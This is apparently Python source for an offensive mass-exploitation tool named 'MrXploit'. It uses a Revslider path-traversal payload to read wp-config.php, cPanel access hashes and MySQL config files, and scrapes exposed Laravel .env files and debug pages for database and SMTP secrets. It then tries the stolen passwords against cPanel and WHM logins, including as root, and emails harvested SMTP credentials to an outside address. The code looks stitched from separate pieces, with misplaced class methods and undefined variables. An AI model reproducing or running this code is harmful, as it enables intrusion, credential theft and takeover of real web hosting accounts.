                                        requests.packages.urllib3.disable_warnings()
                                        loginWHM = req.post('https://' + dom + ':2087/login/',headers=headers, verify=False, data=postloginWHM,timeout=30)
                                    if 'Account Functions' in loginWHM.text :
                                        print(f'{fc}[{res}{url}{fc}] {yl}[{fc}{path}{yl}] {gr}WHM Found')
                                        open('Results/!Valid_WHM.txt', 'a').write('https://' + dom + ':2087|'+username+'|'+password+'\n')
                                    try:
                                        loginRoot = req.post('https://' + dom + ':2087/login/',headers=headers, data=postloginRoot, timeout=30)
                                    except:
                                        requests.packages.urllib3.disable_warnings()
                                        loginRoot = req.post('https://' + dom + ':2087/login/',headers=headers, verify=False, data=postloginRoot,timeout=30)
                                    if 'Account Functions' in loginRoot.text :
                                        print(f'{fc}[{res}{url}{fc}] {yl}[{fc}{path}{yl}] {gr}SSH Found')
                                        open('Results/!Valid_root.txt', 'a').write('https://' + dom + ':2087|root|' + password + '\n')
                    break
                else :
                    print(f'[{gr}{str(progres)}{red}] {fc}[{res}{url}{fc}] {yl}[{fc}{path}{yl}] {red}BAD')
            except :
                print(f'[{gr}{str(progres)}{red}] {fc}[{res}{url}{fc}] {red}ERROR')
    except :
        print(f'[{gr}{str(progres)}{red}] {fc}[{res}{url}{fc}] {red}ERROR')
def wordpressold(url,dom) :
    try:
        headers = {
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        }
        pathes = ["wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"]
        for path in pathes:
            try:
                inj = url + path
                check_inj = requests.get(inj,headers=headers, allow_redirects=True, timeout=15).text
                if 'DB_PASSWORD' in check_inj:
                    print('\033[0m[\033[32m+\033[0m] '+url+' \033[32mYou Got\033[0m \033[32mRevslider''\n' )
                    Gethost = re.findall("'DB_HOST', '(.*)'", check_inj)
                    Getuser = re.findall("'DB_USER', '(.*)'", check_inj)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", check_inj)
                    Getdb = re.findall("'DB_NAME', '(.*)'", check_inj)
                    Getfix = re.findall("table_prefix  = '(.*)'", check_inj)
                    open('Result/db-wordpress.txt', 'a').write(' URL : '+url+'\n Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +'\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[0] + '\n' + ' Fix:   ' + Getfix[0] + '\n---------------------\n')
                    if 'localhost' not in Gethost[0] and '127.0.0.1' not in Gethost[0] and '.' in Gethost[0] :
                        try :
                            cmdWP(Gethost[0], Getuser[0],Getpass[0], Getdb[0], Getfix[0])
                        except:
                            pass
                    else :
                        try :
                            ip = socket.gethostbyname(dom)
                            cmdWP(ip, Getuser[0],Getpass[0], Getdb[0], Getfix[0])
                        except:
                            pass
                    try:
                        checkcp = requests.get('https://' + dom + ':2083/login/',headers=headers, timeout=30).text
                    except:
                        try :
                            requests.packages.urllib3.disable_warnings()
                            checkcp = requests.get('https://' + dom + ':2083/login/',headers=headers, verify=False, timeout=30).text
                        except:
                            checkcp = 'xxxxxxxx'
                            pass
                    if 'cPanel' in checkcp :
                        passwords = []
                        passwords.append(Getpass[0])
                        req = requests.session()
                        if '%2F' in inj :
                            inj_mycnf = inj.replace('wp-config.php', '..%2F.my.cnf')
                            inj_accesshash = inj.replace('wp-config.php', '..%2F.accesshash')
                            inj_username = inj.replace('wp-config.php', '..%2F.cpanel%2Fdatastore%2Fftp_LISTSTORE')
                        else :
                            inj_mycnf = inj.replace('wp-config.php','../.my.cnf')
                            inj_accesshash = inj.replace('wp-config.php', '../.accesshash')
                            inj_username = inj.replace('wp-config.php', '../.cpanel/datastore/ftp_LISTSTORE')
                        ini_env = inj.replace('wp-config.php', '.env')
                        check_inj_mycnf = requests.get(inj_mycnf, timeout=15).text
                        check_inj_accesshash = requests.get(inj_accesshash, timeout=15).text
                        check_inj_username = requests.get(inj_username, timeout=15).text
                        check_ini_env = requests.get(ini_env, timeout=15).text
                        if 'MAIL_HOST' in check_ini_env:
                            SMTP_env = re.findall('MAIL_HOST=(.*)', check_ini_env)[0]
                            PORT_env = re.findall('MAIL_PORT=(.*)', check_ini_env)[0]
                            USERNAME_env = re.findall('MAIL_USERNAME=(.*)', check_ini_env)[0]
                            PASSWORD_env = re.findall('MAIL_PASSWORD=(.*)', check_ini_env)[0]
                            if '"' in SMTP_env :
                                SMTP_env = SMTP_env.replace('"', '')
                            if '"' in PORT_env :
                                PORT_env = PORT_env.replace('"', '')
                            if '"' in USERNAME_env :
                                USERNAME_env = USERNAME_env.replace('"', '')
                            if '"' in PASSWORD_env :
                                PASSWORD_env = PASSWORD_env.replace('"', '')
                            if 'null' not in PASSWORD_env :
                                passwords.append(PASSWORD_env)
                            if 'null' not in PASSWORD_env and PASSWORD_env != '' :
                                passwords.append(PASSWORD_env)
                            if "smtp.mailtrap.io" not in SMTP_env and "mailtrap.io" not in SMTP_env and "gmail.com" not in SMTP_env and 'localhost' not in SMTP_env and 'null' not in SMTP_env and 'null' not in PASSWORD_env and PASSWORD_env != '':
                                print('\033[0m[\033[32m+\033[0m] '+url+' \033[32mYou Got\033[0m \033[32mSMTP''\n' )
                                open('Result/SMTPs-WP.txt', 'a').write(SMTP_env + '|'+PORT_env+'|'+USERNAME_env+'|'+PASSWORD_env+'\n')
                        elif 'SMTP_HOST' in check_ini_env:
                            SMTP_env = re.findall('SMTP_HOST=(.*)', check_ini_env)[0]
                            PORT_env = re.findall('SMTP_PORT=(.*)', check_ini_env)[0]
                            USERNAME_env = re.findall('SMTP_USERNAME=(.*)', check_ini_env)[0]
                            PASSWORD_env = re.findall('SMTP_PASSWORD=(.*)', check_ini_env)[0]
                            if '"' in SMTP_env :
                                SMTP_env = SMTP_env.replace('"', '')
                            if '"' in PORT_env :
                                PORT_env = PORT_env.replace('"', '')
                            if '"' in USERNAME_env :
                                USERNAME_env = USERNAME_env.replace('"', '')
                            if '"' in PASSWORD_env :
                                PASSWORD_env = PASSWORD_env.replace('"', '')
                            if 'null' not in PASSWORD_env :
                                passwords.append(PASSWORD_env)
                            if 'null' not in PASSWORD_env and PASSWORD_env != '' :
                                passwords.append(PASSWORD_env)
                            if "smtp.mailtrap.io" not in SMTP_env and "mailtrap.io" not in SMTP_env and "gmail.com" not in SMTP_env and 'localhost' not in SMTP_env and 'null' not in SMTP_env and 'null' not in PASSWORD_env and PASSWORD_env != '':
                                print('\033[0m[\033[32m+\033[0m] '+url+' \033[32mYou Got\033[0m \033[32mSMTP''\n' )
                                open('Result/SMTPs-WP.txt', 'a').write(SMTP_env + '|'+PORT_env+'|'+USERNAME_env+'|'+PASSWORD_env+'\n')
                        if 'DB_PASSWORD' in check_ini_env:
                            DB_PASSWORD = re.findall('DB_PASSWORD=(.*)', check_ini_env)[0]
                            if '"' in DB_PASSWORD :
                                DB_PASSWORD = DB_PASSWORD.replace('"', '')
                            if 'null' not in DB_PASSWORD :
                                passwords.append(DB_PASSWORD)
                            if "DB_USERNAME=root" in check_ini_env :
                                ROOTU = re.findall('DB_USERNAME=(.*)', check_ini_env)[0]
                                ROOTP = re.findall('DB_PASSWORD=(.*)', check_ini_env)[0]
                                if '"' in ROOTU:
                                    ROOTU = ROOTU.replace('"', '')
                                if '"' in ROOTP:
                                    ROOTP = ROOTP.replace('"', '')
                                if 'null' not in ROOTP and ROOTP != '' :
                                    print('\033[0m[\033[32m+\033[0m] '+url+' \033[32mYou Got\033[0m \033[32mVPS/ROOT''\n' )
                                    open('Result/DB-Roots-WP.txt', 'a').write(dom + '|root|' + ROOTP + '\n')
                        if re.findall('password="(.*)"', check_inj_mycnf) :
                            passwd = re.findall('password="(.*)"', check_inj_mycnf)[0]
                            passwords.append(passwd)
                        elif re.findall('password=(.*)', check_inj_mycnf) :
                            passwd = re.findall('password=(.*)', check_inj_mycnf)[0]
                            passwords.append(passwd)
                        if re.findall('"user":"(.*)_logs"', check_inj_username) :
                            while re.findall('"user":"(.*)_logs"', check_inj_username):
                                check_inj_username = re.findall('"user":"(.*)_logs"', check_inj_username)[0]
                            username = str(check_inj_username)
                            username = username.split('"', 1)[0]
                        elif '_' in Getuser[0] :
                            username = re.findall("(.*)_", Getuser[0])[0]
                        else :
                            username = Getuser[0]
                        if check_inj_accesshash != '' and 'empty' not in check_inj_accesshash and '<' not in check_inj_accesshash and '>' not in check_inj_accesshash and 'Site currently under maintenance' not in check_inj_accesshash and 'file transfer failed' not in check_inj_accesshash:
                            print('\033[0m[\033[32m+\033[0m] '+url+' \033[32mYou Got\033[0m \033[32mAccess HASH Conf!''\n' )
                            open('Result/!WHM-accesshash.txt', 'a').write('https://' + dom + ':2087\n' + username + '|\n'+check_inj_accesshash+'\n-------------------------------------\n')
                        for password in passwords:
                            postlogin = {'user': username, 'pass': password, 'login_submit': 'Log in'}
                            try:
                                login = req.post('https://' + dom + ':2083/login/',headers=headers, data=postlogin, timeout=30)
                            except:
                                requests.packages.urllib3.disable_warnings()
                                login = req.post('https://' + dom + ':2083/login/',headers=headers, verify=False, data=postlogin,timeout=30)
                            if 'filemanager' in login.text:
                                print('\033[0m[\033[32m+\033[0m] '+url+' \033[32mYou Got\033[0m \033[32mCpanel''\n' )
                                open('Result/!cPanels.txt', 'a').write('https://' + dom + ':2083|'+username+'|'+password+'\n')
                                postloginWHM = {'user': username, 'pass': password, 'login_submit': 'Log in'}
                                postloginRoot = {'user': 'root', 'pass': password, 'login_submit': 'Log in'}
                                try:
                                    loginWHM = req.post('https://' + dom + ':2087/login/',headers=headers, data=postloginWHM, timeout=30)
                                except:
                                    requests.packages.urllib3.disable_warnings()
                                    loginWHM = req.post('https://' + dom + ':2087/login/',headers=headers, verify=False, data=postloginWHM,timeout=30)
                                if 'Account Functions' in loginWHM.text :
                                    print('\033[0m[\033[32m+\033[0m] '+url+' \033[32mYou Got\033[0m \033[32mWHM / Reseller''\n' )
                                    open('Result/!Resellers-WHM.txt', 'a').write('https://' + dom + ':2087|'+username+'|'+password+'\n')
                                try:
                                    loginRoot = req.post('https://' + dom + ':2087/login/',headers=headers, data=postloginRoot, timeout=30)
                                except:
                                    requests.packages.urllib3.disable_warnings()
                                    loginRoot = req.post('https://' + dom + ':2087/login/',headers=headers, verify=False, data=postloginRoot,timeout=30)
                                if 'Account Functions' in loginRoot.text :
                                    print('\033[0m[\033[32m+\033[0m] '+url+' \033[32mYou Got\033[0m \033[32mVPS/ROOT''\n' )
                                    open('Result/!roots.txt', 'a').write('https://' + dom + ':2087|root|' + password + '\n')
                    break
                else :
                    print('\033[0m[\033[31m-\033[0m] '+url+' \033[33mChec \033[31mExploit \033[31m | \033[36m Cpanels \033[31m| \033[36m WHM \033[31m | \033[36m VPS \033[31m | \033[36m SMTP''\n').format(fr,path)
            except :
                print('\033[0m[\033[31m-\033[0m] \033[31mThis \033[33mis Not\033[0m \033[36m[Revslider] => \033[31m'+ url +'\n').format(fr)
    except :
        print('\033[0m[\033[31m-\033[0m] \033[31mThis \033[33mis Not\033[0m \033[36m[Revslider] => \033[31m'+ url +'\n').format(fr)


def jembotngw2old(sites):
    if 'http' not in sites:
        site = 'http://' + sites
        #di_chckngntdold(site)
        legaMrXploit(site)
        wordpressCMDold(site)
        #di_BTCold(site)
    else:
        #di_chckngntdold(sites)
        legaMrXploit(site)
        wordpressCMDold(site)
        #di_BTCold(site)
def makethread2old(jumlah):
    try:
        nam = input("\033[32m Input Your List|\033[31mMyMrXploit\033[32m$\033[0m ")
        th = int(jumlah)
        time.sleep(3)
        liss = [i.strip() for i in open(nam, 'r').readlines()]
        zm = Pool(th)
        zm.map(jembotngw2old, liss)
    except Exception as e:
        try:
            pass
        finally:
            e = None
            del e
def wordpressCMDold(url) :
    try :
        dom = domain(url)
        url = URLdomain(url)

        try:
            socket.gethostbyname(dom)
        except:
            print (' \033[31m[x] \033[33m' + url + ' \033[0m===> {}[Siteu Esta nu merge!]'.format(fr))
            return
        envold(url, dom)
    except:
        pass

#CPANELS
def cpanel(host, user, pswd):
    try:
        s = requests.Session()
        data = {"user":user,"pass":pswd}
        text = s.post("https://"+host+":2083/login", data=data, verify=False, allow_redirects=False, timeout=3).text
        if "URL=/cpses" in text:
            print(f"{fc}[{gr}VALID{fc}] {res}{host}{gr}|{res}{user}{gr}|{res}{pswd}")
            fopen = open("Results/Cpanelz.txt","a")
            fopen.write("https://"+host+":2083|"+user+"|"+pswd+"\n")
            fopen.close()
        else:
            print(f"{fc}[{red}BAD{fc}] {res}{host}{red}|{res}{user}{red}|{res}{pswd}")
        s.close()
    except KeyboardInterrupt:
        print("Closed")
        exit()
    except:
        print(f"{fc}[{red}ERROR{fc}] {res}{host}{yl}|{res}{user}{yl}|{res}{pswd}")
def bagian(url):
    try:
        prepare = url.split("|")
        if "://" in prepare[0]:
            host = prepare[0].split('://')[1]
        else:
            host = prepare[0]
        user = prepare[3]
        password = prepare[4]
        cpanel(host, user, password)
        if "_" in prepare[3]:
            userr = prepare[3].split("_")[0]
            ppp = str(userr)
            cpanel(host, ppp, password)
    except:
        pass
    pass
#WHM
def whm(host, user, pswd):
    try:
        headers = {'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'}
        s = requests.Session()
        data = {"user":user,"pass":pswd}
        text = s.post("https://"+host+":2087/login", data=data, headers=headers, verify=False, allow_redirects=False, timeout=15).text
        if "URL=/cpses" in text:
            print(f"{fc}[{gr}VALID{fc}] {res}{host}{gr}|{res}{user}{gr}|{res}{pswd}")
            fopen = open("Results/Whm_Valid.txt","a")
            fopen.write(host+"|"+user+"|"+pswd+"\n")
            fopen.close()
        else:
            print(f"{fc}[{red}BAD{fc}] {res}{host}{red}|{res}{user}{red}|{res}{pswd}")
            fopen = open("Results/Whm_Dead.txt","a")
            fopen.write(host+"|"+user+"|"+pswd+"\n")
            fopen.close()
        s.close()
    except KeyboardInterrupt:
        print("Closed")
        exit()
    except Exception as eror:
        print(f"{fc}[{red}ERROR{fc}] {res}{host}{yl}|{res}{user}{yl}|{res}{pswd}")
        fopen = open("Results/Error.txt","a")
        fopen.write(host+"|"+user+"|"+pswd+"\n")
        fopen.close()
def bagian2(url):
    try:
        prepare = url.split("|")
        if "://" in prepare[0]:
            host = prepare[0].split('://')[1]
        else:
            host = prepare[0]
        user = 'root'
        password = prepare[4]
        whm(host, user, password)
    except:
        pass
    pass
    def laravel_validator(self, counter, length, url):
        try:

            live_list = self.set_result("laravel_site_live.txt")
            dead_list = self.set_result("laravel_site_dead.txt")

            parse_url = urlparse(url)

            if parse_url.scheme:
                target_url = "{}://{}".format(parse_url.scheme if parse_url.scheme in ["http", "https"] else "http", parse_url.netloc)
            else:
                target_url = "http://{}".format(url)

            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "TE": "Trailers",
            }

            #time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            try:

                url_config = "/".join([target_url, ".env"])

                get_config = requests.get(
                    url=url_config,
                    headers=headers,
                    timeout=15,
                    verify=False,
                    allow_redirects=False,
                )

                if "APP_KEY" in get_config.text:
                    self.show_status_message(
                        #time=time_now,
                        counter=counter,
                        length=length,
                        data=target_url,
                        message="Laravel",
                        status=True,
                        mode="Laravel Validator",
                    )
                    self.write_file(live_list, target_url)
                    #telegram_send.send(messages=[target_url,"Laravel Validator"])

                else:
                    get_config = requests.post(
                        url=target_url,
                        data={"0x[]": "x_X"},
                        headers=headers,
                        timeout=5,
                        verify=False,
                        allow_redirects=False,
                    )
                    if "<td>APP_KEY</td>" in get_config.text:
                        self.show_status_message(
                            #time=time_now,
                            counter=counter,
                            length=length,
                            data=target_url,
                            message="Laravel Debug",
                            status=True,
                            mode="Laravel Validator",
                        )
                        self.write_file(live_list, target_url)
                        #telegram_send.send(messages=[target_url])

                    else:

                        self.show_status_message(
                            #time=time_now,
                            counter=counter,
                            length=length,
                            data=target_url,
                            message="Not Laravel",
                            status=False,
                            mode="Laravel Validator",
                        )
                        #self.write_file(dead_list, target_url)

            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
                self.show_status_message(
                    #time=time_now,
                    counter=counter,
                    length=length,
                    data=target_url,
                    message="Can't Connect or Timeout!",
                    status=False,
                    mode="Laravel Validator"
                )


        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
    def reverse_domain_to_ip(self, counter, length, url):
        try:
            reverse_domain_ip = self.set_result(filename="reverse_domain_to_ip.txt")
            #time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            parse_url = urlparse(url)
            if parse_url.scheme:
                target_url = "{}://{}".format(parse_url.scheme if parse_url.scheme in ["http", "https"] else "http", parse_url.netloc)
            else:
                target_url = "http://{}".format(url)

            try:
                ip = socket.gethostbyname(
                    target_url.replace("https://", "")
                    .replace("http://", "")
                    .replace("/", "")
                    .strip()
                )
                self.show_status_message(
                    #time=time_now,
                    counter=counter,
                    length=length,
                    data=target_url,
                    message="IP Address: %s" % ip,
                    status=True,
                    mode="Reverse Domain to IP Address",
                )
                self.write_file(reverse_domain_ip, ip)
            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
                self.show_status_message(
                    #time=time_now,
                    counter=counter,
                    length=length,
                    data=target_url,
                    message="Cannot Connect or Timeout!",
                    status=False,
                    mode="Reverse Domain to IP Address",
                )
        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
            pass
def get_laravel_database(self, counter, length, url):
        try:

            db_config_live = self.set_result(filename="laravel_database_live.txt")
            db_config_dead = self.set_result(filename="laravel_database_dead.txt")

            parse_url = urlparse(url)
            if parse_url.scheme:
                target_url = "{}://{}".format(parse_url.scheme if parse_url.scheme in ["http", "https"] else "http", parse_url.netloc)
            else:
                target_url = "http://".format(url)

            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "TE": "Trailers",
            }

            #time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            try:
                url_config = "/".join([target_url, ".env"])

                get_config = requests.get(
                    url=url_config,
                    headers=headers,
                    timeout=15,
                    verify=False,
                    allow_redirects=False,
                )

                if "APP_KEY" in get_config.text:
                    config_value = get_config.text

                    #gggggg

                    try:
                        db_host = re.findall("DB_HOST=(.*)", config_value)[0]
                    except:
                        db_host = "-"
                    try:
                        db_port = re.findall("DB_PORT=(.*)", config_value)[0]
                    except:
                        db_port = "-"
                    try:
                        db_database = re.findall("DB_DATABASE=(.*)", config_value)[0]
                    except:
                        db_database = "-"
                    try:
                        db_user = re.findall("DB_USERNAME=(.*)", config_value)[0]
                    except:
                        db_user = "-"
                    try:
                        db_pass = re.findall("DB_PASSWORD=(.*)", config_value)[0]
                    except:
                        db_pass = "-"

                else:
                    get_config = requests.post(
                        url=target_url,
                        data={"0x[]": "x_X"},
                        headers=headers,
                        timeout=5,
                        verify=False,
                        allow_redirects=False,
                    )

                    if "<td>APP_KEY</td>" in get_config.text:
                        config_value = get_config.text
                        try:
                            db_host      = re.findall("<td>DB_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            db_host = "-"
                        try:
                            db_port      = re.findall("<td>DB_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            db_port = "-"
                        try:
                            db_database  = re.findall("<td>DB_DATABASE<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            db_database = "-"
                        try:
                            db_user      = re.findall("<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            db_user = "-"
                        try:
                            db_pass      = re.findall("<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            db_pass = "-"
                        #except:
                            #config_value = False
                    else:
                        config_value = False

                if config_value:
                    db_manager = ['/adminer.php','/Adminer.php','/phpmyadmin']
                    for db_path in db_manager:
                        get_db = requests.get(url="".join([target_url, db_path]), timeout=5, verify=False)
                        db_raw = get_db.text

                        if "phpmyadmin.net" in db_raw:
                            db_url = "".join([target_url, db_path])

                            build_db  = "# Login URL: %s\n" % db_url
                            build_db += "# Database Host: %s\n" % db_host
                            build_db += "# Database Port: %s\n" % db_port
                            build_db += "# Database Name: %s\n" % db_database
                            build_db += "# Database Username: %s\n" % db_user
                            build_db += "# Database Password: %s\n\n" % db_pass
                            append_db = self.join_string(build_db)

                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data=target_url,
                                message="Found PHPMyAdmin Config",
                                status=True,
                                mode="Laravel Database Scanner",
                            )

                            self.write_file(db_config_live, append_db)

                        elif "Login - Adminer" in db_raw:
                            db_url = "".join([target_url, db_path])

                            build_db  = "# Login URL: %s\n" % db_url
                            build_db += "# Database Host: %s\n" % db_host
                            build_db += "# Database Port: %s\n" % db_port
                            build_db += "# Database Name: %s\n" % db_database
                            build_db += "# Database Username: %s\n" % db_user
                            build_db += "# Database Password: %s\n\n" % db_pass
                            append_db = self.join_string(build_db)

                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data=target_url,
                                message="Found Adminer Config",
                                status=True,
                                mode="Laravel Database Scanner",
                            )

                            self.write_file(db_config_live, append_db)

                        else:
                            build_db  = "# URL: %s\n" % target_url
                            build_db += "# Database Host: %s\n" % db_host
                            build_db += "# Database Port: %s\n" % db_port
                            build_db += "# Database Name: %s\n" % db_database
                            build_db += "# Database Username: %s\n" % db_user
                            build_db += "# Database Password: %s\n\n" % db_pass
                            append_db = self.join_string(build_db)

                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data=target_url,
                                message=["Database Path Not Found", "Database Config Found"],
                                status=True,
                                mode="Laravel Database Scanner",
                            )

                            self.write_file(db_config_dead, append_db)
                else:
                    self.show_status_message(
                        #time=time_now,
                        counter=counter,
                        length=length,
                        data=target_url,
                        message="Config Not Found",
                        status=False,
                        mode="Laravel Database Scanner",
                    )

            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
                self.show_status_message(
                    #time=time_now,
                    counter=counter,
                    length=length,
                    data=target_url,
                    message="Can't Connect or Timeout!",
                    status=False,
                    mode="Laravel Config Scanner"
                )

        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
def get_laravel_smtp(self, counter, length, url):
        try:

            #db_config_live = self.set_result(filename="laravel_database_live.txt")
            #db_config_dead = self.set_result(filename="laravel_database_dead.txt")

            smtp_live = self.set_result(filename="smtp_live.txt")
            smtp_dead = self.set_result(filename="smtp_dead.txt")

            parse_url = urlparse(url)
            if parse_url.scheme:
                target_url = "{}://{}".format(parse_url.scheme if parse_url.scheme in ["http", "https"] else "http", parse_url.netloc)
            else:
                target_url = "http://".format(url)

            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "TE": "Trailers",
            }

        #    time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            try:
                url_config = "/".join([target_url, ".env"])

                get_config = requests.get(
                    url=url_config,
                    headers=headers,
                    timeout=15,
                    verify=False,
                    allow_redirects=False,
                )

                if "APP_KEY" in get_config.text:
                    config_value = get_config.text

                    #"MAIL_HOST",
                    #"MAIL_PORT",
                    #"MAIL_ENCRYPTION",
                    #"MAIL_USERNAME",
                    #"MAIL_PASSWORD",
                    #"MAIL_FROM_ADDRESS",
                    #"MAIL_FROM_NAME",

                    try:
                        mail_host = re.findall("MAIL_HOST=(.*)", config_value)[0]

                    except:
                        mail_host = "-"

                    try:
                        mail_port = re.findall("MAIL_PORT=(.*)", config_value)[0]
                    except:
                        mail_port = "-"

                    try:
                        mail_user = re.findall("MAIL_USERNAME=(.*)", config_value)[0]
                    except:
                        mail_user = "-"

                    try:
                        mail_pass = re.findall("MAIL_PASSWORD=(.*)", config_value)[0]
                    except:
                        mail_pass = "-"

                    try:
                        mail_from = re.findall("MAIL_FROM_ADDRESS=(.*)", config_value)[0]
                    except:
                        mail_from = "-"

                else:
                    get_config = requests.post(
                        url=target_url,
                        data={"0x[]": "x_X"},
                        headers=headers,
                        timeout=5,
                        verify=False,
                        allow_redirects=False,
                    )

                    if "<td>APP_KEY</td>" in get_config.text:
                        config_value = get_config.text

                        try:
                            mail_host = re.findall("<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]

                        except:
                            mail_host = "-"

                        try:
                            mail_port = re.findall("<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            mail_port = "-"

                        try:
                            mail_user = re.findall("<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            mail_user = "-"

                        try:
                            mail_pass = re.findall("<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            mail_pass = "-"

                        try:
                            mail_from = re.findall("<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            mail_from = "-"
                    else:
                        config_value = False

                if config_value:

                    if "mailtrap.io" not in mail_host and "-" not in mail_host:

                        #CLEAN_ADDR = mail_from if "-" not in mail_from elif "@"  else "j3mbotmaw0ttz@idx.id"
                        CLEAN_ADDR = mail_from if "-" not in mail_from else mail_user if "@" in mail_user else "cmdp4662@gmail.com"
                        #print(from_addr)
                        #if mail_from == "-":
                        #    mail_from = mail_user

                        mime = MIMEMultipart('alternative')
                        mime['Subject'] = "MrXploit 6.7 SMTP Checker (%s)" % CLEAN_ADDR
                        mime['From']    = email.utils.formataddr(("MrXploit", CLEAN_ADDR))
                        mime['To']      = self.SMTP_TEST

                        BODY_TEXT = "====================[ $$ FuckBot Laravel SMTP Scanner $$ ]====================\n"
                        BODY_TEXT += "# Host       : %s\n" % mail_host
                        BODY_TEXT += "# Port       : %s\n" % mail_port
                        BODY_TEXT += "# Username   : %s\n" % mail_user
                        BODY_TEXT += "# Password   : %s\n" % mail_pass
                        BODY_TEXT += "# From Email : %s\n" % CLEAN_ADDR
                        BODY_TEXT += "=========================================================================" + "\n"

                        _body_text_ = self.join_string(BODY_TEXT)

                        BODY_HTML = "<html>\n"
                        BODY_HTML += "<head>\n"
                        BODY_HTML += "<body>\n"
                        BODY_HTML += "<pre>\n"
                        BODY_HTML += BODY_TEXT
                        BODY_HTML += "</pre>\n"
                        BODY_HTML += "</body>\n"
                        BODY_HTML += "</html>\n"

                        _body_html_ = self.join_string(BODY_HTML)

                        plain = MIMEText(_body_text_, 'plain')
                        html = MIMEText(_body_html_, 'html')

                        mime.attach(plain)
                        mime.attach(html)

                        try:
                            server = smtplib.SMTP(mail_host, mail_port)
                            server.ehlo()
                            server.starttls()
                            server.ehlo()
                            server.login(mail_user, mail_pass)
                            server.sendmail(CLEAN_ADDR, self.SMTP_TEST, mime.as_string())
                            server.close()

                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data=target_url,
                                message=["|".join([mail_host, mail_port, mail_user, mail_pass]), "Success"],
                                status=True,
                                mode="Laravel SMTP Scanner",
                            )
